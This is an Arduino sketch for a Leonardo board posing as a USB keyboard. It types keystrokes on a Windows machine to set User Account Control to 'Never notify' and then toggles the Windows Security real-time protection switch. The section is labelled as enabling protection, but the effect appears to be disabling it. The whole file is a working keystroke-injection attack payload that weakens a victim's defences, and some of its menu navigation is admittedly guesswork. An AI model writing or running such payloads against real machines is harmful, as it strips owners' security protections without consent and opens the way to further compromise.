#include <Keyboard.h>

void setup() {
  // Initial Boot/OS Detection Delay
  delay(500); // Wait for the OS to recognize the Leonardo
  Keyboard.begin();

  // --- Start Payload Execution (UAC Disable) ---

  // Windows Key + Open Search
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll(); 
  delay(300); // Wait for the Start Menu search to open

  // STRING uac
  Keyboard.print("uac");
  delay(400); // Wait for the search result to select the UAC setting

  // ENTER to open the UAC Settings window
  Keyboard.write(KEY_RETURN);
  delay(500); 

  // DOWNARROW x 3 (To move the slider down to 'Never notify')
  Keyboard.write(KEY_DOWN_ARROW);
  delay(50); 
  Keyboard.write(KEY_DOWN_ARROW);
  delay(50);
  Keyboard.write(KEY_DOWN_ARROW);
  delay(300); // Slightly longer wait after the sequence

  // TAB (Move to the OK button)
  Keyboard.write(KEY_TAB);
  delay(200);

  // ENTER (Click OK)
  Keyboard.write(KEY_RETURN);
  delay(500); 

  // LEFT + ENTER (If a confirmation/UAC prompt appears)
  Keyboard.write(KEY_LEFT_ARROW);
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(300); // Wait for the UAC change to be processed

  // --- Next Step: Enable Virus & Threat Protection ---

  // Windows Key + Open Search
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll();
  delay(300);

  // STRING virus protection
  Keyboard.print("virus protection");
  delay(200);

  // ENTER to open Windows Security
  Keyboard.write(KEY_RETURN);
  delay(4000); // **Longer delay** for the Windows Security app to fully load

  // TAB x 4 (Navigation to the 'Manage settings' link - this is an estimate!)
  Keyboard.write(KEY_TAB);
  delay(100);
  Keyboard.write(KEY_TAB);
  delay(100);
  Keyboard.write(KEY_TAB);
  delay(100);
  Keyboard.write(KEY_TAB);
  delay(400);
  
  // ENTER (To click the settings link)
  Keyboard.write(KEY_RETURN);
  delay(400);

  // SPACE (To toggle the switch, like 'Real-time protection')
  Keyboard.write(' ');
  delay(400);

  // ALT F4 (Closes the active window)
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
  
  // Stop the Keyboard emulation
  Keyboard.end(); 
}

void loop() {
  // Keep it chill and empty.
}